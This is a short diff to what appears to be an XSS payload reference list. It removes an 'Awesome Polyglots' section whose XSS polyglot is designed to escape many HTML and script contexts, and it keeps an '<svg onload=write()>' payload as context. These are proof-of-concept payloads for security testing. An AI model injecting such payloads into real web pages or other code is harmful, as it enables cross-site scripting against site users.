@@ -91,14 +91,6 @@ This comprehensive list of sinks and source is taken from [domxsswiki](https://g
 <svg onload=write()>
 ```
 
-### Awesome Polyglots
-
-Here's an XSS polyglot that I made which can break out of 20+ contexts:
-```
-%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
-```
-
-Explanation of how it works, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/polyglot.png)
 
 ### Awesome Tags & Event Handlers
 - [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
